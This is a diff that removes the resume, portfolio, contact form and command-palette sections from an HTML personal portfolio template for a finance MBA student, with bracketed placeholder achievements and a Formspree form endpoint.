-          <li class="clients-item"><a href="#"><img src="assets/img/logo-5.svg" alt="Tableau" /></a></li>
-          <li class="clients-item"><a href="#"><img src="assets/img/logo-6.svg" alt="Python" /></a></li>
-        </ul>
-
-      </section>
-
-    </article>
-
-
-    <!-- ==========================================================
-         RESUME
-         ========================================================== -->
-    <article class="resume" data-page="resume">
-
-      <div class="chrome">
-        <span class="chrome-dots"><i></i><i></i><i></i></span>
-        <span class="chrome-path">~/saket/resume</span>
-      </div>
-
-      <header>
-        <h2 class="h2 article-title" data-scramble>Resume</h2>
-      </header>
-
-      <!-- ---------- Education ---------- -->
-      <section class="timeline" data-reveal>
-
-        <div class="title-wrapper">
-          <div class="icon-box">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="m12 4 10 5-10 5L2 9l10-5Z"/><path d="M6 11v5c0 1.7 2.7 3 6 3s6-1.3 6-3v-5"/></svg>
-          </div>
-          <h3 class="h3">Education</h3>
-        </div>
-
-        <ol class="timeline-list">
-          <!-- EDIT: duplicate a <li> per entry. Newest first. -->
-          <li class="timeline-item">
-            <h4 class="h4 timeline-item-title">New York University — MBA</h4>
-            <span>Sep 2024 — May 2026</span>
-            <p class="timeline-text">
-              Concentration in Finance and Corporate Strategy. Relevant coursework:
-              Valuation, Corporate Finance, M&amp;A, Financial Statement Analysis.
-            </p>
-          </li>
-
-          <li class="timeline-item">
-            <h4 class="h4 timeline-item-title">Undergraduate University — B.S.</h4>
-            <span>Aug 2018 — May 2022</span>
-            <p class="timeline-text">
-              B.S. in [Your Major]. GPA, honours, or an activity worth naming.
-            </p>
-          </li>
-        </ol>
-
-      </section>
-
-      <!-- ---------- Experiential learning ---------- -->
-      <section class="timeline" data-reveal>
-
-        <div class="title-wrapper">
-          <div class="icon-box">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 21v-2a4 4 0 0 0-8 0v2"/><circle cx="12" cy="7" r="4"/></svg>
-          </div>
-          <h3 class="h3">Experiential Learning</h3>
-        </div>
-
-        <ol class="timeline-list">
-          <li class="timeline-item">
-            <h4 class="h4 timeline-item-title">Analyst — Student Investment Fund</h4>
-            <span>Jan 2025 — Present</span>
-            <p class="timeline-text">
-              Cover [sector] for a $[N]M student-managed fund. Pitched [company];
-              position returned [%] against a [benchmark] benchmark.
-            </p>
-          </li>
-        </ol>
-
-      </section>
-
-      <!-- ---------- Professional experience ---------- -->
-      <section class="timeline" data-reveal>
-
-        <div class="title-wrapper">
-          <div class="icon-box">
-            <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M8 7V5a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
-          </div>
-          <h3 class="h3">Professional Experience</h3>
-        </div>
-
-        <ol class="timeline-list">
-          <li class="timeline-item">
-            <h4 class="h4 timeline-item-title">Summer Associate — Company Name</h4>
-            <span>Jun 2025 — Aug 2025</span>
-            <p class="timeline-text">
-              Built a three-statement model and DCF for a $[N]M target; analysis supported
-              a [outcome]. Ran comps across [N] peers and drafted the CIM section on [topic].
-            </p>
-          </li>
-
-          <li class="timeline-item">
-            <h4 class="h4 timeline-item-title">Financial Analyst — Company Name</h4>
-            <span>Jan 2023 — May 2024</span>
-            <p class="timeline-text">
-              Owned the monthly forecast for a $[N]M P&amp;L, cutting variance from [%] to [%].
-              Automated the reporting pack and saved [N] hours a month.
-            </p>
-          </li>
-
-          <li class="timeline-item">
-            <h4 class="h4 timeline-item-title">Analyst Intern — Company Name</h4>
-            <span>2021 — 2022</span>
-            <p class="timeline-text">
-              Achievement with a number in it. Another achievement with a number in it.
-            </p>
-          </li>
-        </ol>
-
-      </section>
-
-
-      <!-- ---------- Competency radar ---------- -->
-      <section class="radar-section" data-reveal>
-
-        <h3 class="h3 section-heading">Competency Map</h3>
-
-        <div class="radar-wrap content-card">
-          <svg class="radar" data-radar viewBox="0 0 400 320" role="img" aria-label="Competency radar chart"></svg>
-
-          <!-- EDIT: one <li> per axis. 3–8 axes read best. value = 0–100. -->
-          <ul class="radar-legend" data-radar-data>
-            <li data-label="Valuation"      data-value="92"></li>
-            <li data-label="Modelling"      data-value="88"></li>
-            <li data-label="Accounting"     data-value="80"></li>
-            <li data-label="Strategy"       data-value="85"></li>
-            <li data-label="Data / SQL"     data-value="72"></li>
-            <li data-label="Communication"  data-value="90"></li>
-          </ul>
-        </div>
-
-      </section>
-
-
-      <!-- ---------- Certifications ---------- -->
-      <section class="certs" data-reveal>
-
-        <h3 class="h3 section-heading">Certifications &amp; Coursework</h3>
-
-        <ul class="certs-list">
-          <!-- EDIT: duplicate a <li>. data-status drives the badge colour. -->
-          <li class="cert-card content-card">
-            <div class="icon-box">
-              <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="9" r="6"/><path d="m8.5 14-1.5 8 5-3 5 3-1.5-8"/></svg>
-            </div>
-            <div class="cert-body">
-              <h4 class="h4">CFA Level II</h4>
-              <p class="cert-meta">CFA Institute</p>
-            </div>
-            <span class="cert-badge" data-status="progress">Candidate</span>
-          </li>
-
-          <li class="cert-card content-card">
-            <div class="icon-box">
-              <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M7 9h10M7 13h6"/></svg>
-            </div>
-            <div class="cert-body">
-              <h4 class="h4">Bloomberg Market Concepts</h4>
-              <p class="cert-meta">Bloomberg · 2024</p>
-            </div>
-            <span class="cert-badge" data-status="done">Certified</span>
-          </li>
-
-          <li class="cert-card content-card">
-            <div class="icon-box">
-              <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 20h18M6 20V10m5 10V4m5 16v-7"/></svg>
-            </div>
-            <div class="cert-body">
-              <h4 class="h4">Financial Modeling &amp; Valuation</h4>
-              <p class="cert-meta">CFI · 2024</p>
-            </div>
-            <span class="cert-badge" data-status="done">Certified</span>
-          </li>
-
-          <li class="cert-card content-card">
-            <div class="icon-box">
-              <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 3v18M3 9h18"/></svg>
-            </div>
-            <div class="cert-body">
-              <h4 class="h4">Advanced Excel &amp; VBA</h4>
-              <p class="cert-meta">Microsoft · 2023</p>
-            </div>
-            <span class="cert-badge" data-status="done">Certified</span>
-          </li>
-        </ul>
-
-      </section>
-
-
-      <!-- ---------- Skills ---------- -->
-      <section class="skill" data-reveal>
-
-        <h3 class="h3 section-heading">Technical Skills</h3>
-
-        <ul class="skills-list content-card">
-          <!-- EDIT: change the label and data-level (0–100). The bar and the
-               percentage are both driven by data-level. -->
-          <li class="skills-item" data-level="92">
-            <div class="title-wrapper"><h5 class="h5">Excel / Financial Modelling</h5><data></data></div>
-            <div class="skill-progress-bg"><div class="skill-progress-fill"></div></div>
-          </li>
-
-          <li class="skills-item" data-level="85">
-            <div class="title-wrapper"><h5 class="h5">Valuation &amp; Comps</h5><data></data></div>
-            <div class="skill-progress-bg"><div class="skill-progress-fill"></div></div>
-          </li>
-
-          <li class="skills-item" data-level="78">
-            <div class="title-wrapper"><h5 class="h5">SQL &amp; Python</h5><data></data></div>
-            <div class="skill-progress-bg"><div class="skill-progress-fill"></div></div>
-          </li>
-
-          <li class="skills-item" data-level="80">
-            <div class="title-wrapper"><h5 class="h5">Tableau / Power BI</h5><data></data></div>
-            <div class="skill-progress-bg"><div class="skill-progress-fill"></div></div>
-          </li>
-        </ul>
-
-      </section>
-
-      <div class="resume-download" data-reveal>
-        <!-- EDIT: drop your PDF at assets/files/resume.pdf -->
-        <a href="assets/files/resume.pdf" class="form-btn" target="_blank" rel="noopener">
-          <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3v12m0 0 4-4m-4 4-4-4M4 17v2a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-2"/></svg>
-          <span>Download Resume</span>
-        </a>
-      </div>
-
-    </article>
-
-
-    <!-- ==========================================================
-         PORTFOLIO
-         ========================================================== -->
-    <article class="portfolio" data-page="portfolio">
-
-      <div class="chrome">
-        <span class="chrome-dots"><i></i><i></i><i></i></span>
-        <span class="chrome-path">~/saket/portfolio</span>
-      </div>
-
-      <header>
-        <h2 class="h2 article-title" data-scramble>Portfolio</h2>
-      </header>
-
-      <section class="projects">
-
-        <ul class="filter-list" data-filter-list></ul>
-
-        <div class="filter-select-box">
-          <button class="filter-select" data-select aria-expanded="false">
-            <div class="select-value" data-select-value>Select category</div>
-            <div class="select-icon">
-              <svg viewBox="0 0 24 24" aria-hidden="true"><path d="m6 9 6 6 6-6"/></svg>
-            </div>
-          </button>
-          <ul class="select-list" data-select-list></ul>
-        </div>
-
-        <ul class="project-list" data-project-list>
-
-          <!-- ======================================================
-               EDIT: one <li> per project.
-                 data-category = filter group
-                 href          = your deck / model / write-up
-                 .project-stat = the headline number on the card
-               ====================================================== -->
-
-          <li class="project-item active" data-filter-item data-category="valuation">
-            <a href="#" target="_blank" rel="noopener">
-              <figure class="project-img">
-                <div class="project-item-icon-box">
-                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
-                </div>
-                <img src="assets/img/project-1.svg" alt="DCF Valuation" loading="lazy" />
-                <figcaption class="project-stat">$1.2B EV</figcaption>
-              </figure>
-              <h3 class="project-title">DCF Valuation — [Company]</h3>
-              <p class="project-category">Valuation</p>
-            </a>
-          </li>
-
-          <li class="project-item active" data-filter-item data-category="m&amp;a">
-            <a href="#" target="_blank" rel="noopener">
-              <figure class="project-img">
-                <div class="project-item-icon-box">
-                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
-                </div>
-                <img src="assets/img/project-2.svg" alt="M&A Case" loading="lazy" />
-                <figcaption class="project-stat">+8% accretive</figcaption>
-              </figure>
-              <h3 class="project-title">Buy-Side M&amp;A Case</h3>
-              <p class="project-category">M&amp;A</p>
-            </a>
-          </li>
-
-          <li class="project-item active" data-filter-item data-category="equity research">
-            <a href="#" target="_blank" rel="noopener">
-              <figure class="project-img">
-                <div class="project-item-icon-box">
-                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
-                </div>
-                <img src="assets/img/project-3.svg" alt="Equity Research" loading="lazy" />
-                <figcaption class="project-stat">BUY · $84 PT</figcaption>
-              </figure>
-              <h3 class="project-title">Equity Research Initiation</h3>
-              <p class="project-category">Equity Research</p>
-            </a>
-          </li>
-
-          <li class="project-item active" data-filter-item data-category="strategy">
-            <a href="#" target="_blank" rel="noopener">
-              <figure class="project-img">
-                <div class="project-item-icon-box">
-                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
-                </div>
-                <img src="assets/img/project-4.svg" alt="Market Entry" loading="lazy" />
-                <figcaption class="project-stat">$40M TAM</figcaption>
-              </figure>
-              <h3 class="project-title">Market Entry Strategy</h3>
-              <p class="project-category">Strategy</p>
-            </a>
-          </li>
-
-          <li class="project-item active" data-filter-item data-category="valuation">
-            <a href="#" target="_blank" rel="noopener">
-              <figure class="project-img">
-                <div class="project-item-icon-box">
-                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
-                </div>
-                <img src="assets/img/project-5.svg" alt="LBO Model" loading="lazy" />
-                <figcaption class="project-stat">21.6% IRR</figcaption>
-              </figure>
-              <h3 class="project-title">LBO Model &amp; Returns Analysis</h3>
-              <p class="project-category">Valuation</p>
-            </a>
-          </li>
-
-          <li class="project-item active" data-filter-item data-category="strategy">
-            <a href="#" target="_blank" rel="noopener">
-              <figure class="project-img">
-                <div class="project-item-icon-box">
-                  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
-                </div>
-                <img src="assets/img/project-6.svg" alt="Case Competition" loading="lazy" />
-                <figcaption class="project-stat">1st of 42</figcaption>
-              </figure>
-              <h3 class="project-title">National Case Competition</h3>
-              <p class="project-category">Strategy</p>
-            </a>
-          </li>
-
-        </ul>
-
-      </section>
-
-    </article>
-
-
-    <!-- ==========================================================
-         CONTACT
-         ========================================================== -->
-    <article class="contact" data-page="contact">
-
-      <div class="chrome">
-        <span class="chrome-dots"><i></i><i></i><i></i></span>
-        <span class="chrome-path">~/saket/contact</span>
-      </div>
-
-      <header>
-        <h2 class="h2 article-title" data-scramble>Contact</h2>
-      </header>
-
-      <section class="contact-form" data-reveal>
-
-        <h3 class="h3 form-title">Contact Form</h3>
-
-        <!-- ==========================================================
-             GitHub Pages can't process forms. To make this send:
-               1. Sign up free at https://formspree.io
-               2. Paste your endpoint into action="" below.
-             Until then, submitting opens the visitor's email client.
-             ========================================================== -->
-        <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST" class="form" data-form>
-
-          <div class="input-wrapper">
-            <input type="text" name="fullname" class="form-input" placeholder="Full name" required data-form-input autocomplete="name" />
-            <input type="email" name="email" class="form-input" placeholder="Email address" required data-form-input autocomplete="email" />
-          </div>
-
-          <textarea name="message" class="form-input" placeholder="Your Message" required data-form-input rows="6"></textarea>
-
-          <button class="form-btn" type="submit" disabled data-form-btn>
-            <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7Z"/></svg>
-            <span>Send Message</span>
-          </button>
-
-          <p class="form-status" data-form-status role="status"></p>
-
-        </form>
-
-      </section>
-
-    </article>
-
-  </div>
-
-</main>
-
-
-<!-- ==============================================================
-     COMMAND PALETTE — opens with ⌘K / Ctrl+K.
-     Entries are the COMMANDS array in js/main.js.
-     ============================================================== -->
-<button class="cmdk-trigger" data-cmdk-open aria-label="Open command palette">
-  <kbd>⌘</kbd><kbd>K</kbd>
-</button>
-
-<div class="cmdk" data-cmdk role="dialog" aria-modal="true" aria-label="Command palette">
-  <div class="cmdk-overlay" data-cmdk-close></div>
-  <div class="cmdk-panel">
-    <div class="cmdk-input-row">
-      <span class="cmdk-prompt">&gt;</span>
-      <input type="text" class="cmdk-input" placeholder="run a command…" data-cmdk-input aria-label="Search commands" />
-      <button class="cmdk-esc" data-cmdk-close>esc</button>
-    </div>
-    <ul class="cmdk-list" data-cmdk-list></ul>
-    <div class="cmdk-footer"><kbd>↑</kbd><kbd>↓</kbd> navigate <kbd>↵</kbd> select</div>
-  </div>
-</div>
-
-<div class="toast" data-toast role="status" aria-live="polite"></div>
-
-<script src="js/main.js"></script>
 </body>
 </html>
